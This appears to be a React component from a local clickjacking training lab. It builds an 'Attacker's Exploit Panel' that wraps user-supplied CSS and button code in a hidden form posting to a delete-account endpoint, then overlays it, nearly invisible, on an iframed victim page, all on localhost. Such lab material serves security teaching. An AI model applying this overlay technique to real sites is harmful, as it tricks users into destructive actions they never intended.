import React, { useState, useEffect } from "react";

function ExploitPanel() {
  const [userButtonCode, setUserButtonCode] = useState("");
  const [finalExploit, setFinalExploit] = useState("");
  const [accountId, setAccountId] = useState(null);

  // Fetch the logged-in user's account info (including id)
  useEffect(() => {
    async function fetchAccount() {
      try {
        const res = await fetch(
          "http://127.0.0.1:8080/api/clickJackLab1-account"
        );
        if (res.ok) {
          const data = await res.json();
          // Store the userâ€™s ID for later use in the delete form
          setAccountId(data.account.id);
        } else {
          console.error("Failed to fetch account info");
        }
      } catch (error) {
        console.error("Error fetching account info:", error);
      }
    }
    fetchAccount();
  }, []);

  // Generate the final exploit HTML by wrapping the user-provided snippet
  // in a form that calls the delete endpoint with the dynamic ID.
  const handleGenerateExploit = (e) => {
    e.preventDefault();
    if (!accountId) {
      alert(
        "Account ID not loaded yet. Please wait or check if user is logged in."
      );
      return;
    }

    // We insert the hidden fields for ID and CSRF. The form action calls the delete endpoint.
    const exploitForm = `
<form id="deleteForm" method="POST" action="http://127.0.0.1:8080/api/clickJackLab1-delete-account">
  <input type="hidden" name="id" value="${accountId}" />
  <input type="hidden" name="csrf" value="dummy-csrf-token" />
  ${userButtonCode}
</form>
    `;

    setFinalExploit(exploitForm);
  };

  return (
    <div className="Custom__body--bg">
       <div className="container secondary-bg primary-text my-5 p-5">
      <h1 className="my-4 text-center main-color display-4 fw-bolder">Attacker's Exploit Panel</h1>
      <p className="secondary-text">
        Enter only your <strong>&lt;button&gt;</strong> and{" "}
        <strong>&lt;style&gt;</strong> code here. We will automatically wrap it
        in a form that submits to the <strong>delete</strong> endpoint.
      </p>

      <form onSubmit={handleGenerateExploit} className="exploit-input-form">
        <label htmlFor="exploitCode" className="main-color my-2">Your Button &amp; Style:</label>
          <textarea
            className="secondary-bg focus-bg-transparent form-control scrollbar"
          id="exploitCode"
          rows={8}
          cols={60}
          placeholder={`Example:
<style>
  #deleteOverlay {
    position: absolute;
    top: 220px;
    left: 120px;
    opacity: 0.01;
    z-index: 9999;
    pointer-events: auto;
  }
</style>
<button id="deleteOverlay" type="submit" class="bg-danger">DELETE</button>`}
          value={userButtonCode}
          onChange={(e) => setUserButtonCode(e.target.value)}
        />
        <button type="submit" className="btn-main-color px-5 mx-auto">
          Generate Exploit
        </button>
      </form>

      <div className="mt-5">
        <h2 className="text-center main-color display-6 fw-bold">Live Preview</h2>
        <p className="secondary-text italic">
          Below is an iframe of the real <strong className="main-color"> EditInfo</strong> page. Your
          malicious overlay (if generated) will appear on top. When the user
          clicks your hidden "DELETE" button, it will send a POST request to
          delete the account with ID:{" "}
          <strong className="main-color">{accountId || "(Loading...)"}</strong>
        </p>
        <div className="w-100 position-relative vh-100 ">
          <iframe
            title="Victim Page"
            src="http://localhost:3000/Click_Jacking/Click_Jacking_labs/lab1/EditInfo"
            className="w-100 h-100 "
          />
          {/* The malicious overlay container */}
          <div
            className="position-absolute top-0 start-0 w-100 h-100 "
            dangerouslySetInnerHTML={{ __html: finalExploit }}
          />
        </div>
      </div>
    </div>
   </div>
  );
}

export default ExploitPanel;
